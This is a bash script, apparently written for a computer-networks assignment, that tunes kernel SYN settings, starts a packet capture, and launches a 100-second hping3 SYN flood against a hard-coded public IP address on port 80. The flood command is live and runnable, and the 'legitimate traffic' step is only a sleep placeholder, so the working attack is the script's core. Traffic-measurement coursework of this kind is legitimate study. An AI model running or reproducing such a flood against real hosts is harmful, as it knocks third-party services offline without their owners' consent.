#!/bin/bash
# Ensure the entire script is run with sudo
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

echo "Setting Linux kernel parameters for SYN flood attack..."
sysctl -w net.ipv4.tcp_max_syn_backlog=4096
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_synack_retries=2

echo "Starting tcpdump to capture packets for 240 seconds..."
# Use timeout to automatically stop tcpdump after 240 seconds
timeout 240 tcpdump -i wlo1 -w /home/chirag/Computer_Networks/assignment_2/capture.pcap &
TCPDUMP_PID=$!
echo "tcpdump started with PID: $TCPDUMP_PID"

echo "Starting legitimate traffic..."
# Replace with your legitimate traffic command
# Example: iperf3 -s &
# For demonstration, we'll simulate with sleep (this is a placeholder)
sleep 5 &
LEGIT_TRAFFIC_PID=$!

sleep 20

echo "Starting SYN flood attack..."
# Start SYN flood attack with hping3 using timeout for 100 seconds
timeout 100 hping3 -S -p 80 172.64.155.209 --flood &
SYN_FLOOD_PID=$!
echo "SYN flood attack running with PID: $SYN_FLOOD_PID"

# Wait 100 seconds during the attack (timeout will kill hping3 automatically)
sleep 100

echo "Stopping SYN flood attack..."
# Ensure hping3 is killed if still running
if ps -p $SYN_FLOOD_PID > /dev/null 2>&1; then
    kill -9 $SYN_FLOOD_PID
fi

sleep 20

echo "Stopping legitimate traffic..."
# Replace with your command to stop legitimate traffic if needed
if ps -p $LEGIT_TRAFFIC_PID > /dev/null 2>&1; then
    kill -9 $LEGIT_TRAFFIC_PID
fi

echo "SYN flood attack simulation completed."
